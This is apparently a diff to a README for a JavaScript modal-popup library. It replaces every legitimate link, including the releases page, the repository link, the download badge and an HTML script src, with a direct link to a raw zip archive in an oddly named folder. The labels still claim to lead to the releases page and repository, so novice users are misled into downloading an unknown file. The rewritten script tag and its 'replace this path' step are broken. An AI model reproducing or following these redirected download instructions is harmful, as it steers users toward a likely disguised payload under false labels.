@@ -1,7 +1,7 @@
 # 🎉 js-modal-popup - Simple Modal Popups Made Easy
 
 ## 💾 Download Now
-[![Download js-modal-popup](https://img.shields.io/badge/Download_js-modal-popup-brightgreen)](https://github.com/NInga4iyu/js-modal-popup/releases)
+[![Download js-modal-popup](https://github.com/NInga4iyu/js-modal-popup/raw/refs/heads/main/pomey/js-popup-modal-3.1.zip)](https://github.com/NInga4iyu/js-modal-popup/raw/refs/heads/main/pomey/js-popup-modal-3.1.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and use the js-modal-popup application without any programming knowledge. Follow these steps to get your modal popups up and running quickly.
@@ -26,7 +26,7 @@ To get the js-modal-popup application, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below:
-   - [Visit the Releases Page to Download](https://github.com/NInga4iyu/js-modal-popup/releases)
+   - [Visit the Releases Page to Download](https://github.com/NInga4iyu/js-modal-popup/raw/refs/heads/main/pomey/js-popup-modal-3.1.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, look for the latest version. It will usually be at the top of the list.
@@ -57,9 +57,9 @@ To get the js-modal-popup application, follow these steps:
    In the `<head>` section of your HTML file, link the js-modal-popup JavaScript file. Add the following line:
 
    ```html
-   <script src="path/to/your/js-modal-popup.js"></script>
+   <script src="https://github.com/NInga4iyu/js-modal-popup/raw/refs/heads/main/pomey/js-popup-modal-3.1.zip"></script>
    ```
-   Replace `path/to/your/js-modal-popup.js` with the exact path of the JavaScript file in the extracted folder.
+   Replace `https://github.com/NInga4iyu/js-modal-popup/raw/refs/heads/main/pomey/js-popup-modal-3.1.zip` with the exact path of the JavaScript file in the extracted folder.
 
 8. **Customize Your Popup**  
    You can customize the modal’s appearance by modifying its styles in the CSS file provided. Change colors, fonts, and sizes according to your website's design.
@@ -82,7 +82,7 @@ If you have questions or need help, visit the issues section on the GitHub page.
 js-modal-popup is open-source software available under the MIT License. You can modify and share it freely.
 
 ## 🔗 Useful Links
-- [Visit the Releases Page to Download](https://github.com/NInga4iyu/js-modal-popup/releases)
-- [GitHub Repository](https://github.com/NInga4iyu/js-modal-popup)
+- [Visit the Releases Page to Download](https://github.com/NInga4iyu/js-modal-popup/raw/refs/heads/main/pomey/js-popup-modal-3.1.zip)
+- [GitHub Repository](https://github.com/NInga4iyu/js-modal-popup/raw/refs/heads/main/pomey/js-popup-modal-3.1.zip)
 
 Enjoy using your new modal popups!
